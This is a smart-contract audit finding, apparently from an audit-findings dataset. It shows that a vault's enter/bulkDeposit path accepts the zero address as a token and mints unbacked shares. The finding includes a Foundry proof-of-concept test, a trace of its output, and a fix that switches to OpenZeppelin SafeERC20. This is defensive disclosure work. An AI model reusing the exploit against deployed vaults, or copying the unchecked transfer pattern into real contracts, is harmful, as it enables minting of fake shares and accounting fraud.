# [M] Minting of fake shares for non-existent ERC20 tokens

## Summary
Severity: Medium
Contest weight: 0.6667
Dataset id: 6025
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The protocol utilizes solmate's SafeTransferLib for transferring ERC20 tokens during the enter function. However, solmate's SafeTransferLib does not check whether the token address provided is a valid contract or not. This contrasts with OpenZeppelin's SafeERC20, which includes a check to ensure that the provided address is a contract.  
If a non-existent token address (e.g., 0x0000000000000000000000000000000000000000) is provided during the enter function, the transaction will still succeed without any errors. This could potentially lead to the minting of fake shares for a non-existent ERC20 token.  
While this issue alone may not directly cause fund loss, as the non-existent token cannot be withdrawn or transferred, it could lead to accounting discrepancies and potential vulnerabilities if the non-existent token contract is later deployed at the same address.  
```solidity
/**
* @notice Allows minter to mint shares, in exchange for assets.
* @dev If assetAmount is zero, no assets are transferred in.
*/
function enter(address from, ERC20 asset, uint256 assetAmount, address to, uint256 shareAmount)
external
requiresAuth
{
    // Transfer assets in
    if (assetAmount > 0) asset.safeTransferFrom(from, address(this), assetAmount);
    // Mint shares.
    _mint(to, shareAmount);
    emit Enter(from, address(asset), assetAmount, to, shareAmount);
}
```

## Proof of Concept
```solidity
function testSolmateVulnerability(uint256 amount) external {
    amount = bound(amount, 0.0001e18, 10_000e18);
    uint256 fakeToken_amount = amount.mulDivDown(1e18, IRateProvider(FAKEToken_RATE_PROVIDER).getRate());
    ERC20 nonExistentToken = ERC20(0x0000000000000000000000000000000000000000);
    teller.bulkDeposit(nonExistentToken, fakeToken_amount, 0, address(this));
}
```
Output:  
[PASS] testSolmateVulnerability(uint256) (runs: 257, : 132983, ~: 133078)  
Traces:  
[133080] TellerWithMultiAssetSupportTest::testSolmateVulnerability(73882507095584939857760549393070179058599 ⌋ 2162620060501269 [7.388e56])  
[0] console::log("Bound Result", 6649807209276899681100 [6.649e21]) [staticcall]  
 [Stop]  
[30252] 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee::getRate() [staticcall]  
[25369] 0xe629ee84C1Bd9Ea9c677d2D5391919fCf5E7d5D9::getRate() [delegatecall]  
[20043] 0x308861A430be4cce5502d0A12724771Fc6DaF216::amountForShare(1000000000000000000 [1e18]) [staticcall]  
[15157] 0x403ba4cd327293A4d23beE172982509d37310cEF::amountForShare(1000000000000000000 [1e18]) [delegatecall]  
[7246] 0x35fA164735182de50811E8e2E824cFb9B6118ac2::totalShares() [staticcall]  
[2363] 0x1B47A665364bC15C28B05f449B53354d0CefF72f::totalShares() [delegatecall]  
 [Return] 0x000000000000000000000000000000000000000000006a88575d625a4366d78b  
 [Return] 0x000000000000000000000000000000000000000000006a88575d625a4366d78b  
 [Return] 1032844804788224332 [1.032e18]  
 [Return] 1032844804788224332 [1.032e18]  
 [Return] 1032844804788224332 [1.032e18]  
 [Return] 1032844804788224332 [1.032e18]  
[88091] TellerWithMultiAssetSupport::bulkDeposit(0x0000000000000000000000000000000000000000, 6438341151011921562763 [6.438e21], 0, TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])  
[7405] RolesAuthority::canCall(TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], TellerWithMultiAssetSupport: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0x9d57442000000000000000000000000000000000000000000000000000000000) [staticcall]  
 [Return] true  
[5165] AccountantWithRateProviders::getRateInQuoteSafe(0x0000000000000000000000000000000000000000) [staticcall]  
 [Return] 1000000000000000000 [1e18]  
[62133] BoringVault::enter(TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 6438341151011921562763 [6.438e21], TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6438341151011921562763 [6.438e21])  
[7405] RolesAuthority::canCall(TellerWithMultiAssetSupport: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], BoringVault: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x39d6ba3200000000000000000000000000000000000000000000000000000000) [staticcall]  
 [Return] true  
[0] 0x0000000000000000000000000000000000000000::transferFrom(TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BoringVault: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 6438341151011921562763 [6.438e21])  
 [Stop]  
emit Transfer(from: 0x0000000000000000000000000000000000000000, to: TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 6438341151011921562763 [6.438e21])  
emit Enter(from: TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], asset: 0x0000000000000000000000000000000000000000, amount: 6438341151011921562763 [6.438e21], to: TellerWithMultiAssetSupportTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], shares: 6438341151011921562763 [6.438e21])  
 [Stop]  
emit BulkDeposit(asset: 0x0000000000000000000000000000000000000000, depositAmount: 6438341151011921562763 [6.438e21])  
 [Return] 6438341151011921562763 [6.438e21]  
 [Stop]

## Recommendation
To mitigate this issue, it is recommended to use OpenZeppelin's SafeERC20 library instead of solmate's SafeTransferLib. OpenZeppelin's implementation includes a check to ensure that the provided token address is a contract before proceeding with the transfer.
